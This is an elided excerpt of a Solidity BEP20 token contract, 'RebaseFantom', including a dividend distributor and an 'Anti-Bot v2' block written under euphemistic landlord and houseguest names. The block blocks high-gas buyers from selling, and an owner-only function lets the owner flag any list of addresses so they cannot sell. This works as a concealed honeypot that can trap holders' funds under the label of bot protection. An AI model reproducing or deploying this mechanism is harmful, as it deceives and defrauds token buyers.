...
/*
  ...
  _____      _                    ______          _                  
 |  __ \    | |                  |  ____|        | |                 
 | |__) |___| |__   __ _ ___  ___| |__ __ _ _ __ | |_ ___  _ __ ___  
 |  _  // _ \ '_ \ / _` / __|/ _ \  __/ _` | '_ \| __/ _ \| '_ ` _ \ 
 | | \ \  __/ |_) | (_| \__ \  __/ | | (_| | | | | || (_) | | | | | |
 |_|  \_\___|_.__/ \__,_|___/\___|_|  \__,_|_| |_|\__\___/|_| |_| |_|
...
contract DividendDistributor is IDividendDistributor {
    ...
    // Reward Token in example it is BSC Doge
...
contract RebaseFantom is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "RebaseFantom";
    string constant _symbol = "RebaseFantom";
    ...
    // Anti-Bot v2
    uint256 public maxPayableRent = 8000000000;
    bool public isLandlord = false;
    mapping (address => bool) public iswelcomedguest;
    ...
    event Landlordcheckin(address guest, uint256 rentPaid);
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0xCdE8847E6272306311481C242c37bEB9c29A3d3c;
        devFeeReceiver = 0xCdE8847E6272306311481C242c37bEB9c29A3d3c;
    ...
    // plz ser, dont snipe with a bot
        if(isLandlord){
            require(!iswelcomedguest[sender],"Bots cant sell");
            if(tx.gasprice > maxPayableRent && sender == pair){
                iswelcomedguest[recipient] = true;
                emit Landlordcheckin(recipient, tx.gasprice);
            }
        }
    ...
    // lobby manager
    function enable_is_Land_Lordmode(bool _status) public onlyOwner {
        isLandlord = _status;
    }

    function set_max_PayableRent(uint256 _rent_withoutdecimal) public onlyOwner {
        maxPayableRent = _rent_withoutdecimal * 10**9;
    }

    function manage_houseguests(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            iswelcomedguest[addresses[i]] = status;
        }
    }
